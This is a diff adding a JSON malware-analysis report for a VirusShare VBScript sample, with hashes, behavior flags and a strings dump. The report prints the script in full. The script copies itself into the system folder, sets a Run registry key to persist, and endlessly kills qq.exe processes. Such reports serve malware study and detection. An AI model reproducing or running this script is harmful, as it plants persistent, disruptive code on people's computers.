@@ -1,0 +1,54 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CreateObject": "May create an OLE object",
+            "Run": "May run an executable file or a system command",
+            "Shell": "May run an executable file or a system command",
+            "Windows": "May enumerate application windows",
+            "Wscript.Shell": "May run an executable file or a system command",
+            "system": "May run an executable file or a system command on a Mac"
+        },
+        "macro": "On Error Resume Next\nSet fs=CreateObject(\"Scripting.FileSystemObject\")\nSet dir2=fs.GetSpecialFolder(1)\nSet so=CreateObject(\"Scripting.FileSystemObject\")\nSet r=CreateObject(\"Wscript.Shell\")\nso.GetFile(WScript.ScriptFullName).Copy(dir2&\"\\system.vbs\")\nr.Regwrite \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\system\",\"system.vbs\"\ndo\nstrComputer = \".\"\nSet objWMIService = GetObject(\"winmgmts:\" & \"{impersonationLevel=impersonate}!\\\\\" & strComputer & \"\\root\\cimv2\")\nSet colProcessList = objWMIService.ExecQuery (\"Select * from Win32_Process Where Name = 'qq.exe'\")\nFor Each objProcess in colProcessList\nobjProcess.Terminate()\nNext\nloop"
+    },
+    "filename": "VirusShare_06723e015880985698ea5f824a2e8385",
+    "filesize": 656,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "06723e015880985698ea5f824a2e8385",
+        "sha1": "b09bca2d24fd0dc5fc2b271f6a6bde25417c599e",
+        "sha256": "00cecb8ed1846c7641d6438d68a51b9dcdb41c15bac7494f96e8528d59ffe004"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "On Error Resume Next",
+            "Set fs=CreateObject(\"Scripting.FileSystemObject\")",
+            "Set dir2=fs.GetSpecialFolder(1)",
+            "Set so=CreateObject(\"Scripting.FileSystemObject\")",
+            "Set r=CreateObject(\"Wscript.Shell\")",
+            "so.GetFile(WScript.ScriptFullName).Copy(dir2&\"\\system.vbs\")",
+            "r.Regwrite \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\system\",\"system.vbs\"",
+            "strComputer = \".\"",
+            "Set objWMIService = GetObject(\"winmgmts:\" _",
+            "& \"{impersonationLevel=impersonate}!\\\\\" & strComputer & \"\\root\\cimv2\")",
+            "Set colProcessList = objWMIService.ExecQuery _",
+            "(\"Select * from Win32_Process Where Name = 'qq.exe'\")",
+            "For Each objProcess in colProcessList",
+            "objProcess.Terminate()",
+            "Next",
+            "loop"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.264614",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
